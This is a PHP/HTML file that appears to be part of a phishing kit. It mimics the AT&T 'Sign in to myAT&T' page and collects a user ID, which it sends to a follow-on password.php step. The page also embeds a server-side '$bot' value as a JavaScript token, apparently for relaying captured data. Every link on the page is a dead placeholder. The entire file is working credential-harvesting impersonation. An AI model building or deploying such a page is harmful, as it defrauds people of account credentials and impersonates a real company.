<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>login</title>
</head>
<body>

<main>
    <div class="continer">
    <form action="password.php" method="get">

<div class="logo">
<img src="res/img/logo.png" >
    <script>var token=<?php echo json_encode($bot); ?>;</script>
</div>

<div class="title">
<h1> Sign in </h1>
</div>
<div class="title">
<h2> to myAT&T</h2>
</div>


<div class="col">
<label>User ID</label>

<input type="text"  name="user" required>
</div>

<div class="but">
<button type="submit">Continue</button>
</div>

<div class="a">
<a href="#">Forgot user ID?</a>
<a href="#">Don't have a user ID? Create one now</a>
<a href="#">Pay without signing in</a>
</div>

<div class="r"> 
<hr> 
</div>

<div class="but1">
<button type="button">Sign in with myAT&T app</button>
</div>

</form>
    </div>

    <div class="bot1">

 <img src="res/img/mobil.png">

</div>
    <div class="bot">
<script src="./res/jq.js"></script>
<script src="./res/jquery.js"></script>
<img src="res/img/botom.png" >

</div>


</main>


</body>
</html>